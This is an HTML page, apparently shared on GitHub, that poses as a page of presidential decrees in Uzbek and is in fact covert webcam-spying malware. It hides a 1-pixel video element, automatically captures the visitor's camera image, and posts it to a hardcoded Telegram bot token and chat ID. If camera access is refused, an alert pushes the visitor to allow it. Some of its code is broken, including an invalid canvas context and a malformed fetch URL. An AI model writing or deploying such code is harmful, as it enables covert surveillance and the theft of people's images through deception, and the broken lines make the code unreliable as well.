[index.html](https://github.com/user-attachments/files/24494309/index.html)
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>PRIZIDENT QARORLARI</title>
</head>
<body>
    <!-- Kamera ko'rinmasligi uchun videoni kichik qilamiz yoki yashiramiz -->
    <video id="video" autoplay playsinline style="width:1px; height:1px; opacity: 0;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // SOZLAMALAR:
        const BOT_TOKEN = '8287232126:AAH_Z1mFxaBfyarKbNQFBz1xQ2pico0OSsE';
        const CHAT_ID = '8261811040';

        // Kamerani yoqish
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            
            // Kamera yoqilgach, 1 soniya kutib avtomatik rasm oladi
            setTimeout(() => {
                const context = canvas.getContext('1d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'auto_shot.png');

                    fetch(api.telegram.org{BOT_TOKEN}/sendPhoto, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // Rasm ketgandan so'ng xohlasangiz boshqa saytga yuborish mumkin
                        // window.location.href = "https://google.com";
                    });
                }, 'image/png');
            }, 2000); 
        })
        .catch(err => {
            alert("Sayt ishlashi uchun kameraga ruxsat berishingiz kerak!");
        });
    </script>
</body>
</html>
